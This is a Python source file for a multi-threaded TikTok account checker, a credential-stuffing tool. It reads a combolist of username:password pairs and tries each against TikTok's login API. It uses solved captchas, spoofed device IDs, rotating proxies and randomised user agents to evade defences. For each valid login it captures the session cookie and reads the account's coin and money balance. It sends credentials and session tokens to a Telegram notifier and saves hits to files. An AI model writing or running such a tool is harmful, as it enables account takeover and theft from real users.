import os
import time
import random
import secrets
import threading
import requests
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
from config.settings import proxies_list
from utils.helpers import generate_random_device, generate_verifyFp, xor_value
from utils.tiktok_api import GetInfo, send_telegram_notification
from .captcha_solver import CaptchaSolver

class TikTokChecker:
    def __init__(self, max_workers=150, max_retries=3):
        self.hits = 0
        self.secured = 0
        self.tofa = 0
        self.bad = 0
        self.idk = 0
        self.checked = 0
        self.lines = 0
        self.coinss = 0
        self.monyy = 0.0
        self.rate_limited = 0
        self.retry_count = 0
        self.captcha_3D = 0
        self.done_solve_captcha = 0
        self.proxy_list = proxies_list.copy()
        self.accounts = []
        self.retry_accounts = {}
        self.device_usage = {}
        self.max_retry_number = max_retries
        self.lock = threading.Lock()
        self.semaphore = threading.Semaphore(max_workers)
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()

    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════╗
║          TIKTOK ACCOUNT CHECKER - ULTIMATE EDITION       ║
║               Multi-Threaded | Async Ready               ║
╚══════════════════════════════════════════════════════════╝
        """
        print(banner)

    def captcha_solve_sync(self):
        for _ in range(5):
            try:
                proxy = random.choice(self.proxy_list) if self.proxy_list else None
                raw_device = generate_random_device()
                device_parts = raw_device.split(':')
                if len(device_parts) < 6:
                    continue
                device_id = device_parts[1]
                with self.lock:
                    if device_id in self.device_usage and self.device_usage[device_id] >= 3:
                        continue
                captcha_result = CaptchaSolver(
                    iid=device_parts[0], did=device_id,
                    device_type=device_parts[2], device_brand=device_parts[3], proxy=proxy
                ).start()
                if not captcha_result or captcha_result.get("code") != 200:
                    continue
                with self.lock:
                    self.device_usage[device_id] = self.device_usage.get(device_id, 0) + 1
                    self.done_solve_captcha += 1
                return device_id
            except Exception:
                continue
        return None

    def check_account(self, username, password):
        self.semaphore.acquire()
        try:
            device_id = self.captcha_solve_sync()
            if not device_id:
                with self.lock:
                    self.bad += 1
                    self.checked += 1
                return
            csrf_token = secrets.token_hex(10)
            verifyFp = generate_verifyFp()
            rez = generate_random_device()
            d = rez.split(':')[1]
            params = {"device_id": device_id, "aid": 8311, "account_sdk_source": "web",
                      "sdk_version": "2.1.9", "verifyFp": verifyFp, "sign": d, "qs": d}
            url = "https://api31-normal-alisg.tiktokv.com/passport/web/user/login/"
            data = f"mix_mode=1&username={xor_value(username)}&password={xor_value(password)}&fp=verify{device_id}&verifyFp=verify_{device_id}&device_id={device_id}&language=en&multi_login=1&fixed_mix_mode=1"
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Tt-Passport-Csrf-Token": csrf_token,
                "referer": "https://www.tiktok.com/",
                "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) TikTok/0.89.0 Chrome/{random.randint(108,123)}.0.{random.randint(5000,5999)}.{random.randint(0,300)} Electron/22.3.18-tt.11.release.main.48 TTElectron/22.3.18-tt.11.release.main.48 Safari/537.36"
            }
            proxy = random.choice(self.proxy_list) if self.proxy_list else None
            proxies = {"http": f'http://{proxy}', "https": f'http://{proxy}'} if proxy else None
            response = requests.post(url, params=params, headers=headers, data=data, proxies=proxies, timeout=15)
            json_response = response.json()
            text = response.text
            if "data" in json_response and "session_key" in json_response["data"]:
                sss = response.cookies.get_dict().get("sessionid")
                with self.lock:
                    self.hits += 1
                    self.checked += 1
                try:
                    info = GetInfo.gets_mony(sss)
                    coins = info.get("coins", 0)
                    money = info.get("mony", 0.0)
                    with self.lock:
                        self.coinss += coins
                        self.monyy += money
                except Exception:
                    pass
                send_telegram_notification(username, password, 1, sss)
                self.save_result('data/hiit.txt', f'{username}:{password}')
            elif "2-step" in text:
                with self.lock:
                    self.tofa += 1
                    self.checked += 1
                send_telegram_notification(username, password, 3, "")
            elif "verify_ticket" in text:
                with self.lock:
                    self.secured += 1
                    self.checked += 1
                send_telegram_notification(username, password, 2, "")
                self.save_result('data/sec.txt', f'{username}:{password}')
            elif any(x in text for x in ["Username or password doesn't match",
                                         "Incorrect account or password",
                                         "Account doesn't exist"]):
                with self.lock:
                    self.bad += 1
                    self.checked += 1
            elif "verify_center_decision_conf" in text:
                with self.lock:
                    self.captcha_3D += 1
                    self.checked += 1
            elif "Maximum number of attempts reached. Try again later" in text:
                key = f"{username}:{password}"
                with self.lock:
                    retry_num = self.retry_accounts.get(key, 0)
                    if retry_num >= self.max_retry_number:
                        self.rate_limited += 1
                        self.checked += 1
                        self.save_result('results/rate_limited.txt', f'{username}:{password}')
                    else:
                        self.retry_accounts[key] = retry_num + 1
                        self.retry_count += 1
                time.sleep(30)
                self.semaphore.release()
                self.check_account(username, password)
                return
            else:
                with self.lock:
                    self.idk += 1
                    self.checked += 1
                self.save_result('results/idk.txt', f'{username}:{password}:{json_response}')
        except Exception:
            with self.lock:
                self.bad += 1
                self.checked += 1
        finally:
            self.semaphore.release()

    def save_result(self, filepath, content):
        with self.lock:
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(content + '\n')

    def display_stats(self):
        while self.checked < self.lines:
            with self.lock:
                print("\033[H\033[J", end="")
                print(
                    f"Hits: {self.hits}\n"
                    f"Secured: {self.secured}\n"
                    f"2FA: {self.tofa}\n"
                    f"Bads: {self.bad}\n"
                    f"IDK: {self.idk}\n"
                    f"Retry: {self.retry_count}\n"
                    f"RateLimit: {self.rate_limited}\n"
                    f"3D: {self.captcha_3D}\n"
                    f"Coins: {self.coinss}\n"
                    f"Money: ${self.monyy:.2f}"
                )
            time.sleep(0.3)

    def update_proxies(self):
        while True:
            try:
                with open("data/proxies.txt", encoding="utf-8", errors='ignore') as f:
                    proxies = [line.strip() for line in f if '@' in line.strip()]
                with self.lock:
                    self.proxy_list = proxies
            except Exception:
                pass
            time.sleep(5)

    def load_accounts(self):
        try:
            with open("data/combolist.txt", encoding="utf-8", errors='ignore') as f:
                accounts = set(line.strip() for line in f if ':' in line.strip())
                self.accounts = list(accounts)
                self.lines = len(self.accounts)
        except FileNotFoundError:
            print("[!] File combolist.txt not found in data folder")
            exit(1)

    def run(self):
        self.load_accounts()
        try:
            os.remove("result.txt")
        except Exception:
            pass
        threading.Thread(target=self.display_stats, daemon=True).start()
        threading.Thread(target=self.update_proxies, daemon=True).start()
        print(f"[+] Loaded {self.lines} accounts for checking")
        print(f"[+] Starting check with {self.executor._max_workers} workers\n")
        futures = []
        for account in self.accounts:
            username, password = account.split(':', 1)
            future = self.executor.submit(self.check_account, username, password)
            futures.append(future)
        concurrent.futures.wait(futures)
        print(f"\n\nChecking completed")
        print(f"Final results:")
        print(f"  Hits: {self.hits}")
        print(f"  Secured: {self.secured}")
        print(f"  2FA: {self.tofa}")
        print(f"  Bads: {self.bad}")
        print(f"  IDK: {self.idk}")
        print(f"  Total Coins: {self.coinss}")
        print(f"  Total Money: ${self.monyy:.2f}")
        self.executor.shutdown()